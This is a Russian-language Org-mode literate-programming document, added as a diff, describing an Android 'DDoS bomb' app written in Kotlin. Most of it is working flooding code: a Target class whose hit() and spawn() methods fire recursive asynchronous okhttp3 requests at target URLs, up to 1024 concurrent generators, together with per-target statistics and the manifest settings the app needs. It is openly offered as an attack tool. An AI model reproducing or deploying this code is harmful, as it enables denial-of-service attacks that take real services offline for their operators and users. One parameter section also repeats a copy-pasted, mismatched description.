@@ -1,0 +1,277 @@
+#+title: =DDoS=-бомба на =Android=
+
+Использует те же алгоритмы, что и другие бомбы. Скелет проекта создан с помощью автоматического
+генератора шаблонов =Android Studio=, при реализации было учтено несколько важных моментов.
+
+* =HTTP=-запросы
+
+Делаются с помощью библиотеки =okhttp3=, образец описан в [[https://medium.com/@chris_42047/making-rest-calls-in-kotlin-android-using-okhttp-and-couroutines-dcff3b525ad6][примере]]. Однако, в описании есть следующие
+неточности.
+
+Важно, что =http=-запросы не могут вызываться в главном потоке, вместо этого использована асинхронная
+библиотека [[https://developer.android.com/kotlin/coroutines][Kotlin coroutines]]. Однако в примере показано, что переменные, якобы, могут быть использованы
+за пределами контекста. На самом деле, все переменные в пределах контекста недоступны, а чтобы получить
+доступ к элеметам пользовательского интерфейса, нужно выполнять код внутри главного контекста, как
+описано в [[https://stackoverflow.com/questions/59491707/how-to-wait-for-end-of-a-coroutine][рекомендации]].
+
+В примере также предлагается воспользоваться =klaxon= для декодирования =json=-ответов. Однако, этот код
+не работает, если ответ является массивом строк, в этом случае почему-то после декодирования получается
+массив из одной строки-аргумента. Вместо этого пришлось воспользоваться стандартным декодером [[https://developer.android.com/reference/kotlin/org/json/JSONArray][JSONArray]],
+который отработал правильно и не требует сторонних библиотек.
+
+* Разрешения сети
+
+Для доступа к сети приложению нужно разрешение =INTERNET= со следующими особенностями.
+
+В файле манифеста необходимо добавить строку
+
+#+begin_src xml
+  <?xml version="1.0" encoding="utf-8"?>
+  <manifest ...>
+      <uses-permission android:name="android.permission.INTERNET" />
+      <application
+          ...
+          ...>
+          ...
+      </application>
+  </manifest>
+#+end_src
+
+Однако и это не решает всех проблем, так как не допускает вызова по небезопасному =http=-протоколу. В
+[[https://stackoverflow.com/questions/45940861/android-8-cleartext-http-traffic-not-permitted][примере]] описано, что необходимо указать атрибут ~usesCleartextTraffic~.
+
+#+begin_src xml
+  <?xml version="1.0" encoding="utf-8"?>
+  <manifest ...>
+      ...
+      <application
+          ...
+          android:usesCleartextTraffic="true"
+          ...>
+          ...
+      </application>
+  </manifest>
+#+end_src
+
+* Табличная раскладка
+
+Сделана на основе [[https://www.tutorialspoint.com/android/android_table_layout.htm][примера]] и [[https://developer.android.com/reference/android/widget/TableLayout][документации]]. Сложность тут в том, что таблица будет генерироваться
+динамически, на основе полученного списка строк.
+
+* Использование связок
+
+/Связки/ (/Binding/) упрощают доступ к отдельным элементам пользовательского интерфейса. Их использование
+описано в [[https://developer.android.com/topic/libraries/view-binding#kotlin][документации]].
+
+* Цель
+:PROPERTIES:
+:ID:       bc4ffae5-5c54-41b6-90ce-8014da06da4e
+:END:
+
+#+begin_src kotlin :noweb yes :tangle app/src/main/java/com/kosenko/stopwar/Target.kt
+  package com.kosenko.stopwar
+
+  import okhttp3.OkHttpClient
+  <<stopwar-android:Target:Импорт>>
+
+  data class Target(
+      val url: String,
+      <<stopwar-android:Target:Атрибуты>>
+  ) {
+      companion object {
+          val httpClient = OkHttpClient()
+          <<stopwar-android:Target:Определения-класса>>
+      }
+
+      <<stopwar-android:Target:Определения-экземпляра>>
+  }
+#+end_src
+
+** Статистика
+
+Статистика цели включает количество генераторов ~jobsCount~, количество успешных вызовов ~successCount~ и
+количество неудачных вызовов ~failureCount~. Так как эти атрибуты используются в разных потоках, они тоже
+должны быть [[https://developer.android.com/reference/kotlin/java/util/concurrent/atomic/AtomicInteger][атомарными]].
+
+#+begin_src kotlin :noweb-ref stopwar-android:Target:Импорт
+  import java.util.concurrent.atomic.AtomicInteger
+#+end_src
+
+#+begin_src kotlin :noweb-ref stopwar-android:Target:Атрибуты
+  var jobsCount: AtomicInteger = AtomicInteger(0),
+  var successCount: AtomicInteger = AtomicInteger(0),
+  var failureCount: AtomicInteger = AtomicInteger(0),
+#+end_src
+
+** Признак исполнения
+
+Признак исполнения ~isRun~ является общим для всех целей, а потому опделеняется для класса.
+
+#+begin_src kotlin :noweb-ref stopwar-android:Target:Определения-класса
+  var isRun = false
+#+end_src
+
+** Общее количество генераторов
+
+Кроме счетчиков генераторов в отдельных задачах введем общий счетчик задач. Так как это поле используется
+совместно несколькими потоками, его нужно сделать [[https://developer.android.com/reference/kotlin/java/util/concurrent/atomic/AtomicInteger][атомарным]].
+
+#+begin_src kotlin :noweb-ref stopwar-android:Target:Определения-класса
+  var jobsCount = AtomicInteger(0)
+#+end_src
+
+** Процент неудач
+
+#+begin_src kotlin :noweb-ref stopwar-android:Target:Определения-экземпляра
+  fun failRate(): UInt {
+      val sc = successCount.toFloat()
+      val fc = failureCount.toFloat()
+      return (fc / (sc + fc) * 10000 / 100).toUInt()
+  }
+#+end_src
+
+** Вызов цели
+
+Для простоты метод ~hit~ объединен с ~run~.
+
+#+begin_src kotlin :noweb-ref stopwar-android:Target:Импорт
+  import okhttp3.Callback
+  import okhttp3.Request
+  import okhttp3.Call
+  import okio.IOException
+  import okhttp3.Response
+#+end_src
+
+#+begin_src kotlin :noweb-ref stopwar-android:Target:Определения-экземпляра
+  private fun hit() {
+      val req = Request.Builder()
+          .url(url).build()
+      val call = httpClient.newCall(req)
+      call.enqueue(
+          object: Callback {
+              override fun onFailure(call: Call, e: IOException) {
+                  failureCount.incrementAndGet()
+                  jobsCount.decrementAndGet()
+                  Target.jobsCount.decrementAndGet()
+              }
+
+              override fun onResponse(call: Call, response: Response) {
+                  if (response.isSuccessful) {
+                      successCount.incrementAndGet()
+                      if (isRun && Target.jobsCount.get() < totalJobsLimit.get() && jobsCount.get() < targetJobsLimit.get()) {
+                          hit()
+                          spawn()
+                      } else {
+                          jobsCount.decrementAndGet()
+                          Target.jobsCount.decrementAndGet()
+                      }
+                  } else {
+                      failureCount.incrementAndGet()
+                      jobsCount.decrementAndGet()
+                      Target.jobsCount.decrementAndGet()
+                  }
+              }
+          }
+      )
+  }
+
+#+end_src
+
+** Порождение
+
+#+begin_src kotlin :noweb-ref stopwar-android:Target:Определения-экземпляра
+  fun spawn() {
+      if (isRun && Target.jobsCount.get() < totalJobsLimit.get() && jobsCount.get() < targetJobsLimit.get()) {
+          jobsCount.incrementAndGet()
+          Target.jobsCount.incrementAndGet()
+          hit()
+      }
+  }
+#+end_src
+
+** Построение строки
+
+#+begin_src kotlin :noweb-ref stopwar-android:Target:Импорт
+  import android.content.Context
+  import android.widget.TableRow
+  import android.widget.TextView
+#+end_src
+
+#+begin_src kotlin :noweb-ref stopwar-android:Target:Определения-экземпляра
+  fun newRow(ctx: Context): TableRow {
+      val result = TableRow(ctx)
+
+      val rlp = TableRow.LayoutParams(
+          TableRow.LayoutParams.WRAP_CONTENT,
+          TableRow.LayoutParams.WRAP_CONTENT,
+          1F
+      )
+
+      result.addView(newCol(ctx, rlp, url))
+      result.addView(newNumericCol(ctx, rlp, jobsCount.toString()))
+      result.addView(newNumericCol(ctx, rlp, successCount.toString()))
+      result.addView(newNumericCol(ctx, rlp, failureCount.toString()))
+      result.addView(newNumericCol(ctx, rlp, failRate().toString()))
+
+      return result
+  }
+
+  private fun newCol(ctx: Context, lp: TableRow.LayoutParams, v: String): TextView {
+      val result = TextView(ctx)
+      result.text = v
+      result.layoutParams = lp
+      result.setPadding(8, 0, 0, 0)
+      return result
+  }
+
+  private fun newNumericCol(ctx: Context, lp: TableRow.LayoutParams, v: String): TextView {
+      val result = newCol(ctx, lp, v)
+      result.textAlignment = TextView.TEXT_ALIGNMENT_TEXT_END
+      return result
+  }
+#+end_src
+* Параметры
+
+** Порог общего количества генераторов
+
+Значение /Порога общего количества генераторов/ (/Total Jobs Limit/) ограничивает общее количество
+генераторов. По умолчанию это значение равно ~1024~.
+
+Управление этим порогом выполняется через редактор ~totalJobsLimitEditor~. Для простоты будем считать,
+что значение этого редактора, которое задается в описании интерфейса пользователя, по умолчанию тоже
+равно ~1024~, что позволит не выполнять инициализацию параметра при запуске.
+
+#+begin_src kotlin :noweb-ref stopwar-android:Target:Определения-класса
+  val TOTAL_JOBS_LIMIT_DEFAULT = 1024U
+  var totalJobsLimit = AtomicInteger(TOTAL_JOBS_LIMIT_DEFAULT.toInt())
+#+end_src
+
+** Порог количества генераторов на цель
+
+Значение /Порога количества генераторов на цель/ (/Jobs per Target Limit/, /Target Jobs Limit)
+ограничивает количество генераторов на одну цель. По умолчанию это значение равно ~256~.
+
+#+begin_src kotlin :noweb-ref stopwar-android:Target:Определения-класса
+  val TARGET_JOBS_LIMIT_DEFAULT = 256U
+  var targetJobsLimit = AtomicInteger(TARGET_JOBS_LIMIT_DEFAULT.toInt())
+#+end_src
+
+Управление этим порогом выполняется через редактор ~targetJobsLimitEditor~. Для простоты будем считать,
+что значение этого редактора, которое задается в описании интерфейса пользователя, по умолчанию тоже
+равно ~256~, что позволит не выполнять инициализацию параметра при запуске.
+
+** Порог отображения целей
+
+Значение /Порога отображения целей/ (/Show Target Limit/) определяет, сколько генераторов должно работать
+по цели, чтобы она отображалась в статистике. По умолчанию это значение равно ~2~.
+
+#+begin_src kotlin :noweb-ref stopwar-android:Target:Определения-класса
+  val SHOW_TARGET_LIMIT_DEFAULT = 2U
+  var showTargetLimit = AtomicInteger(SHOW_TARGET_LIMIT_DEFAULT.toInt())
+#+end_src
+
+Управление этим порогом выполняется через редактор ~targetJobsLimitEditor~. Для простоты будем считать,
+что значение этого редактора, которое задается в описании интерфейса пользователя, по умолчанию тоже
+равно ~256~, что позволит не выполнять инициализацию параметра при запуске.
+
+* TODO Выделить ~Target~ в отдельный файл
